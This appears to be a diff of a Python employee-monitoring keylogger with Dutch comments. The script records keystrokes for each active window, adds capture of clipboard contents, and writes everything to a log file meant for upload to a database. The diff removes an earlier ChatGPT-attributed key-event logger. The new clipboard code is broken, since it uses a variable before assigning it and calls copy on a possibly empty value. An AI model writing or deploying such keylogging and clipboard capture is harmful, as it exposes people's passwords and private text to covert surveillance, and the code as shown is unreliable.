@@ -10,7 +10,8 @@ import web_and_app_info_logger
 import keystrokes_and_clipboard_logger
 import os
 import datetime
-import keyboard
+import keyboard as kb
+import win32clipboard
 
 event_string = ''
 # Hieronder de relevante code
@@ -19,34 +20,18 @@ def main():
         # Code voor versturen van het bestand naar DB
         print("Bestand is verstuurd naar de database!")
 
-######################################################################### Deze code zou alle data moeten opslaan (IS VAN CHATGPT), maar houdt
-    ##################################################################### 0 rekening met applicaties...
-    def on_press(event):
-        global event_string
-        if keyboard.is_modifier(event):
-            event_string = event_string + ' ' + event.name
-        else:
-            event_string += event.name
-    if len(event_string.split()) >= 10:
-        with open("keyboard_events.txt", 'a') as f:
-            f.write(event_string + '\n')
-            event_string = ''
-
-    keyboard.on_press(on_press)
-    keyboard.wait()
-
-
-################################################################################################## Soort van werkende code
     with open("keyboard_events.txt", 'w') as f:
         f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
         f.write("======================================================" + "\n")
         keylogger = keystrokes_and_clipboard_logger.Keylogger()
         last_window_title = None
+        new_clipboard_data = None
 
-        # BUG: Slaat momenteel niet de keylogs op van de laatste applicatie, i.v.m. dat
-        # Data pas wordt opgeslagen wanneer het laatste scherm != aan het huidige scherm
-        # Andere functies van keyboard lijken niet te werken, i.v.m. beperkingen die iedere heeft.
-        # Ziet er dus uit dat er altijd een zekere mate van verlies aan data zal zijn.
+        # TECHNICAL DEBT: Currently does not save the logged keys from the last opened application.
+        # This happens because data does not get saved until the previous window != current active windows.
+        # Attempts have been made e.g. using kb.record() to fix this, but those have had different drawbacks.
+        # For now, this works well enough under the idea that monitored employees will end at the desktop before
+        # shutting down their device
         while True:
             active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
             if active_window_title != last_window_title and keylogger.is_recording:
@@ -57,6 +42,13 @@ def main():
                 keylogger.start_keylogger_recording()
                 f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
             last_window_title = active_window_title
+
+            win32clipboard.OpenClipboard()
+            if old_clipboard_data != new_clipboard_data and new_clipboard_data is not None:
+                f.write(f"CLIPBOARD DATA: {new_clipboard_data} \n")
+            old_clipboard_data = new_clipboard_data.copy()
+            new_clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
 
 
 if __name__ == '__main__':
